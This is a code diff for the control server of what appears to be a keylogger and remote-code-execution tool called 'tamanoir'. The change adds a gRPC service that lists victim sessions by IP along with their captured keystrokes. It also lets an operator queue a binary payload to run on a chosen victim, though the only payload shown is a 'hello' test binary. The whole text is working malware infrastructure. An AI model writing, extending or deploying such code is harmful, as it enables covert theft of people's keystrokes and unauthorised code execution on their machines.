@@ -1,5 +1,9 @@
 pub mod cli;
-pub mod handlers;
+pub mod dns_proxy;
+pub mod rce;
+pub mod tamanoir_grpc {
+    tonic::include_proto!("tamanoir");
+}
 
 use core::fmt;
 use std::{
@@ -9,19 +13,25 @@ use std::{
     net::{Ipv4Addr, SocketAddr},
     process::Command,
     str::FromStr,
-    sync::OnceLock,
+    sync::Arc,
 };
 
+use log::{debug, info};
 use serde::Deserialize;
+use tokio::sync::Mutex;
+use tonic::{transport::Server, Request, Response, Status};
+
+use crate::tamanoir_grpc::{
+    proxy_server::{Proxy, ProxyServer},
+    GetSessionsResponse, NoArgs, SessionResponse, SetSessionRceRequest,
+};
 
 const COMMON_REPEATED_KEYS: [&str; 4] = [" 󱊷 ", " 󰌑 ", " 󰁮 ", "  "];
-static KEYMAPS: OnceLock<HashMap<u8, KeyMap>> = OnceLock::new();
 const AR_COUNT_OFFSET: usize = 10;
 const AR_HEADER_LEN: usize = 12;
 const FOOTER_TXT: &str = "r10n4m4t/";
 const FOOTER_EXTRA_BYTES: usize = 3;
 const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
-
 const HELLO_X86_64: &[u8] = include_bytes!("../../assets/examples/bins/hello_x86_64.bin");
 
 #[derive(Debug, Clone, PartialEq)]
@@ -135,6 +145,8 @@ pub struct Session {
 
     pub keys: Vec<String>,
     pub key_codes: Vec<u8>,
+    pub rce_payload: Option<Vec<u8>>,
+    pub rce_payload_buffer: Option<Vec<u8>>,
 }
 impl Session {
     pub fn new(sock_addr: SocketAddr) -> Option<Self> {
@@ -143,8 +155,31 @@ impl Session {
                 ip: *addr.ip(),
                 keys: vec![],
                 key_codes: vec![],
+                rce_payload: None,
+                rce_payload_buffer: None,
             }),
             _ => None,
+        }
+    }
+    pub fn set_rce_payload(&mut self, rce: &str, target_arch: TargetArch) -> Result<(), String> {
+        if let Some(_) = self.rce_payload {
+            return Err(format!(
+                "An out payload already exists for session {}",
+                self.ip
+            ));
+        }
+        match target_arch {
+            TargetArch::X86_64 => match &*rce {
+                "hello" => {
+                    self.rce_payload = Some(HELLO_X86_64.to_vec());
+                    Ok(())
+                }
+                _ => Err(format!(
+                    "{} payload unavailable for arch {:#?}",
+                    rce, target_arch
+                )),
+            },
+            _ => Err(format!("target arch {:#?} unavailable", target_arch)),
         }
     }
 }
@@ -179,16 +214,6 @@ impl Display for Session {
     }
 }
 
-pub fn select_payload(rce: String, target_arch: TargetArch) -> Option<Vec<u8>> {
-    if target_arch != TargetArch::X86_64 {
-        return None;
-    }
-    match &*rce {
-        "hello" => Some(HELLO_X86_64.to_vec()),
-
-        _ => None,
-    }
-}
 pub struct Cmd {
     pub shell: String,
     pub stdout: bool,
@@ -225,4 +250,87 @@ struct CargoMetadata {
 #[derive(Debug, Deserialize)]
 struct PackageMetadata {
     name: String,
+}
+pub async fn serve_tonic(sessions: SessionsStore) -> anyhow::Result<()> {
+    let addr = "[::1]:50051".parse().unwrap();
+
+    info!("Starting grpc server");
+    debug!("Grpc server is listning on  [::1]:50051");
+    Server::builder()
+        .add_service(ProxyServer::new(sessions))
+        .serve(addr)
+        .await?;
+    Ok(())
+}
+
+type SessionsState = Arc<Mutex<HashMap<Ipv4Addr, Session>>>;
+#[derive(Clone)]
+pub struct SessionsStore {
+    pub sessions: SessionsState,
+}
+impl SessionsStore {
+    pub fn new() -> Self {
+        Self {
+            sessions: Arc::new(Mutex::new(HashMap::new())),
+        }
+    }
+}
+
+#[tonic::async_trait]
+impl Proxy for SessionsStore {
+    async fn get_sessions(
+        &self,
+        request: Request<NoArgs>,
+    ) -> Result<Response<GetSessionsResponse>, Status> {
+        debug!(
+            "<GetSessions> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+            self.sessions.lock().await;
+
+        let mut sessions: Vec<SessionResponse> = vec![];
+        for s in current_sessions.values().into_iter() {
+            sessions.push(SessionResponse {
+                ip: s.ip.to_string(),
+                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
+            })
+        }
+
+        let reply = GetSessionsResponse { sessions };
+        Ok(Response::new(reply))
+    }
+    async fn set_session_rce(
+        &self,
+        request: Request<SetSessionRceRequest>,
+    ) -> Result<Response<NoArgs>, Status> {
+        debug!(
+            "<SetSessionRce> Got a request from {:?}",
+            request.remote_addr()
+        );
+        let req = request.into_inner();
+        let ip = Ipv4Addr::from_str(&req.ip)
+            .map_err(|_| Status::new(402.into(), format!("{}: invalid ip", req.ip)))?;
+
+        let mut current_sessions: tokio::sync::MutexGuard<'_, HashMap<Ipv4Addr, Session>> =
+            self.sessions.lock().await;
+        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
+            Status::new(
+                402.into(),
+                format!("{}: unknown target arch", req.target_arch),
+            )
+        })?;
+        match current_sessions.get_mut(&ip) {
+            Some(existing_session) => {
+                match existing_session.set_rce_payload(&req.rce, target_arch) {
+                    Ok(_) => Ok(Response::new(NoArgs {})),
+                    Err(_) => Err(Status::new(404.into(), format!("{}: invalid rce", req.rce))),
+                }
+            }
+            None => Err(Status::new(
+                404.into(),
+                format!("{}: session not found", ip),
+            )),
+        }
+    }
 }
